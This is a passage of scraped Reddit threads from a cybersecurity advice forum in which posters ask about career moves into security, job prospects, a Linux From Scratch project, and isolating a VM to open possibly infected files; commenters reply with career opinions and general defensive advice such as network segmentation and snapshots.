      "text": "Hi. CCIE here with 12 yeo. I’m nearing my 40s and considering a career transition. \n\nI’m overall pessimistic about the future of network engineering. Outsourcing, AI and config simplification are eliminating jobs and or reducing pay. It just no longer makes sense in my mind to constantly be studying, learning new tech, chasing/renewing certs to be making low six figures. Further, companies want you to know everything. It used to be a meme but they genuinely want someone who knows it all and pay them low six figures. It is possible to make around 200k (LCOL area) as a network engineer but you have to be top 5% candidate. Long story short, I’m just kinda over it. I want to do my 9-5 and go home.\n\nWould GRC/Audit roles be a good fit for me? Is there a specific cert I should get? Is there a better role given my background.\n\nAny advice much appreciated. ",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qt3655/ccie_to_it_sec/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o31l1w6",
          "author": "dahra8888",
          "text": "Network Architect will get you out of Ops while still utilizing your existing skillset and experience to the max potential.\n\nNetwork Security would be the easiest transition if you do want to go into cybersecurity. You're generally not called as often as Networking but you are still in line so sometimes Networking will escalate to you. Again, Network Security Architect will get you fully out of Ops.",
          "score": 1,
          "created_utc": "2026-02-01 21:32:55",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o32riw6",
          "author": "EirikAshe",
          "text": "I’m a network security engineer. Best of both worlds - networking is a very big part, plus security compliance. With your background, you would be an ideal candidate and you can make very good money.",
          "score": 1,
          "created_utc": "2026-02-02 01:19:06",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o332i9m",
          "author": "RobotBaseball",
          "text": "Ugh I feel you. I’m about to turn 35 and I don’t think traditonal network engineering has more than 10 years left. The contract roles I see all pay < 60/hr and its a race to the bottom\n\nHaving said that, do you realistically think you can pivot to GRC, audit, or other non tech security roles? Have you considered consulting, sales engineering, account management? It’s less of a technical grind and has more financial upside ",
          "score": 1,
          "created_utc": "2026-02-02 02:21:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o376c2j",
          "author": "pthomsen91",
          "text": "Why are you an ops person with a ccie? Lol. I never met one of those before.",
          "score": 1,
          "created_utc": "2026-02-02 18:26:50",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3a3d1y",
          "author": "cmillerIT007",
          "text": "This is the exact opposite of what I have seen.  Everyone is pessimistic about the future of Cybersecurity and switching to Network Engineering for more stable jobs.  Half of our team is working on CCNA right now.",
          "score": 1,
          "created_utc": "2026-02-03 03:26:30",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3a49i8",
          "author": "Forbesington",
          "text": "I'm a Cybersecurity Director at a large government agency and I LOVE hiring network engineers. To be good at Cybersecurity you have to understand how networks work. Honestly, security is easy, understanding networks is the hard part. I always suggest every security person get a CISSP. If you have experience in two of the domains, with your years of experience you would qualify. I say go for it.",
          "score": 1,
          "created_utc": "2026-02-03 03:31:57",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o30zok2",
          "author": "S4LTYSgt",
          "text": "Why not just learn ansible and automation and own SDN/SDWAN to future proof. I cant imagine going from CCIE to cybwr",
          "score": 0,
          "created_utc": "2026-02-01 19:48:48",
          "is_submitter": false,
          "replies": [
            {
              "id": "o311gzn",
              "author": "Big_Wet_Beefy_Boy",
              "text": "The goal is to stop being an ops person and delving into automation is more of the same.",
              "score": 2,
              "created_utc": "2026-02-01 19:57:16",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o313sqr",
                  "author": "S4LTYSgt",
                  "text": "Since you have tons of experience you could shift to more management? Maybe a masters and CISSP could lead to a manager role at like a big consulting firm. I had a guy on my team when I worked for the big 4 consulting firm who was CCNP and was AWS professional level certified, 15 years of experience hes now a consulting manager",
                  "score": 1,
                  "created_utc": "2026-02-01 20:08:27",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o30435z",
          "author": "The_Red_Serpent",
          "text": "ISO 2007 Lead auditor , CISSP. I heard GRC and audit stuff pays well but I'm pretty sure it will be wiped out by AI as well. But realistically speaking u should move into manager role, people managing roles won't be gone by AI",
          "score": -1,
          "created_utc": "2026-02-01 17:24:51",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qvcypv",
      "title": "Are there enough opportunities in cyber sec domain?",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qvcypv/are_there_enough_opportunities_in_cyber_sec_domain/",
      "author": "dhulanageswarao",
      "created_utc": "2026-02-04 03:04:15",
      "score": 3,
      "num_comments": 8,
      "upvote_ratio": 0.67,
      "text": "\n\nI’m starting my career as a Cybersecurity Analyst , and I wanted some guidance.\nIs cybersecurity a good domain in the long run?\nAre there sufficient opportunities and openings in companies for this role?\nMy current pay is decent , so I feel it’s reasonable for a fresher, but I’d like to understand the growth potential.\nI’m also a bit concerned about future flexibility:\nIf I decide later to switch my stream and apply for an SDE role, would this cybersecurity experience be useful or relevant?\nIf I continue in the cybersecurity domain, will this experience significantly help my career growth?\nPeople who have done a master’s in cybersecurity, or\nProfessionals in senior positions\n\nWhat is the earning potential for cybersecurity professionals in the long term?\nAny advice or real-world experience would be very helpful.",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qvcypv/are_there_enough_opportunities_in_cyber_sec_domain/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o3hsfah",
          "author": "Revolutionary_Task59",
          "text": "Yes Infosec and cybersec",
          "score": 3,
          "created_utc": "2026-02-04 07:43:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3ht68x",
          "author": "Raccoon_Medical",
          "text": "No opportunities, you are very lucky you've got any entry level role. Like winning a lottery lucky. Does cybersec helps grow? Without foundations in IT, it will be like learning quantum physics without standard physics.",
          "score": 2,
          "created_utc": "2026-02-04 07:49:57",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3itt38",
          "author": "afahrholz",
          "text": "Cybersecurity offers strong growth and skills useful for related tech roles.",
          "score": 1,
          "created_utc": "2026-02-04 12:59:57",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3j19uo",
          "author": "moobybooby",
          "text": "The job market is really ballooning this sector while the budgets for these roles are going down with automation being leveraged.",
          "score": 1,
          "created_utc": "2026-02-04 13:43:07",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3op098",
          "author": "Impossible_Ad_3146",
          "text": "Yes, it’s useless skill to have",
          "score": 1,
          "created_utc": "2026-02-05 08:38:21",
          "is_submitter": false,
          "replies": [
            {
              "id": "o3pyhwt",
              "author": "Dependent-Put-1445",
              "text": "All 3 braincells working overtime to type this comment",
              "score": 1,
              "created_utc": "2026-02-05 14:23:36",
              "is_submitter": false,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qrac7f",
      "title": "How good is an LFS project?",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qrac7f/how_good_is_an_lfs_project/",
      "author": "thmisfittheory",
      "created_utc": "2026-01-30 16:33:26",
      "score": 2,
      "num_comments": 13,
      "upvote_ratio": 0.67,
      "text": "I'm a Undergraduate student pursuing civil engineering. I've a lot of intrest in cyber security now, so I've gone through the basic concepts of it did some small scannings using nmap etc. I'm thinking of building a linux from scratch related to networks, to learn and understand whole linux. How good would that be on resume. I'm also thinking to do masters related to cybersecurity too. Is that a good option. Feel free to share your advices. ",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qrac7f/how_good_is_an_lfs_project/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o2ppvv2",
          "author": "Intelligent_Comb_338",
          "text": "It depends a lot on what you want to achieve. If it's for security/cybersecurity, you'll have to make many changes. For example, you could change OpenSSL to LibresSL, which is a fork made specifically for security by OpenBSD (https://www.openbsd.org/) , a fork of NetBSD designed to be secure; perhaps you'd be more interested in it than LFS).",
          "score": 1,
          "created_utc": "2026-01-31 01:29:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2q4it3",
              "author": "thmisfittheory",
              "text": "I'll check it out thanks!!",
              "score": 1,
              "created_utc": "2026-01-31 02:56:04",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2qa2l7",
          "author": "Redditthr0wway",
          "text": "What kind of cybersecurity? A lot of people tend to get wrapped up in the broad aspect when there are specializations to the field. For some, your project will work better for your cause than other projects. It all depends what you are looking for.",
          "score": 1,
          "created_utc": "2026-01-31 03:30:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2qb95p",
              "author": "thmisfittheory",
              "text": "I'm gonna go for blue team roles or as Security engineer. Could you also please tell me what is the viable option on doing Masters? Should I go for it??",
              "score": 1,
              "created_utc": "2026-01-31 03:37:57",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o2qbu7d",
                  "author": "Redditthr0wway",
                  "text": "I mean a degree is a degree, it holds some weight but in this field, it holds less weight than say an engineering degree. You will be competing for roles against people who have bachelor's degrees and most likely IT/cyber experience for those kinds of roles. You can certainly do it but know that you will have to work a while doing say help desk or a SOC position.",
                  "score": 2,
                  "created_utc": "2026-01-31 03:41:40",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qqj64b",
      "title": "How to make a secure and isolated VM taking into account network for a college student exposed to infected files",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qqj64b/how_to_make_a_secure_and_isolated_vm_taking_into/",
      "author": "procastinator_engine",
      "created_utc": "2026-01-29 19:56:00",
      "score": 2,
      "num_comments": 5,
      "upvote_ratio": 0.67,
      "text": "Hello there! I'm trying to create VM on linux using qemu however I can't find a tutorial on how to properly configure qemu to keep the VM completely isolated from the host machine or at least to not let a virus and/or malware escape easily to my physical machine. I also do not know how to secure my network if a file infects it and all my devices within my home net, I thought of a VPN but that's more like a privacy tool more than a security tool.\n\nI plan to use the VM to search for books and other kinds of scientific material for college that could be infected with some kind of virus or malware (if you know what I mean) because I'm from a third world country, the college library isn't so complete and if the book needed is there it's never available, some professors are kind enough to send us the digital versions of the books but I don't think that they check if the file is infected or not and I'm sure that they get it from an unsafe source. That's why I need a REALLY isolated virtual machine and some way to protect my network or something to obfuscate it so the threat could not enter to my net.\n\nIf somebody could help me or point me in the right direction would be much appreciated!",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qqj64b/how_to_make_a_secure_and_isolated_vm_taking_into/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o2h7jyg",
          "author": "ConsistentWeb1092",
          "text": "Have you thought of using a firewall and segmented that particular vm? I would put it on a separate vlan and set the rules accordingly to not allow any LAN traffic to the rest of the network. Disabling clipboard, shared files, etc. take a snapshot before and after exposure and revert back after examining the malware output. Backing up the entire system as a failsafe. OR you could just use any third party site to such as any.run or others. I forget them lol",
          "score": 2,
          "created_utc": "2026-01-29 20:38:06",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2hh6b0",
              "author": "procastinator_engine",
              "text": "Thanks for the answer! I actually haven't thought of segmenting vlans and setting firewall and network rules (primarily because I did not know about that lol) however after setting that rules would I still be able to browse the internet from my VM? Because I want to search for all the content inside the VM for more security.",
              "score": 1,
              "created_utc": "2026-01-29 21:24:11",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o2hig1o",
                  "author": "ConsistentWeb1092",
                  "text": "I would not do any work beside analyzing the malware in that VM. As far as allowing WAN access that entirely depends on you and what malware youre studying. If you wanted to see what outbound connections are being made i would also port mirror to a SIEM to monitor what happening and also use like Velicoraptor to monitor what changes are being made to the VM.",
                  "score": 2,
                  "created_utc": "2026-01-29 21:30:08",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    }
  ]
}